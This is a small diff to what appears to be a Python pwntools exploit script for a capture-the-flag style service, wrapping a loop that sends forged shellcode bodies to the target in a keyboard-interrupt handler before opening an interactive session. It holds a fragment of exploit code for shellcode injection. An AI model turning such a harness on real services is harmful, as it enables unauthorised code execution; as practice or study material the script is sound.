@@ -26,12 +26,15 @@ shell_code = shellc.decode().splitlines()[0][26:]
 
 forged = generate_forged(shell_code)
 
-for body in forged:
-    r.sendline('2')
-    r.recvuntil(ask_for_shellcode)
-    r.sendline(body)
-    r.recvuntil(bad_code_phase_1)
-    r.recvuntil(bad_code_phase_2)
-    print('tried body', body, 'but likely fail')
+try:
+    for body in forged:
+        r.sendline('2')
+        r.recvuntil(ask_for_shellcode)
+        r.sendline(body)
+        r.recvuntil(bad_code_phase_1)
+        r.recvuntil(bad_code_phase_2)
+        print('tried body', body, 'but likely fail')
+except KeyboardInterrupt:
+    pass
 
 r.interactive()
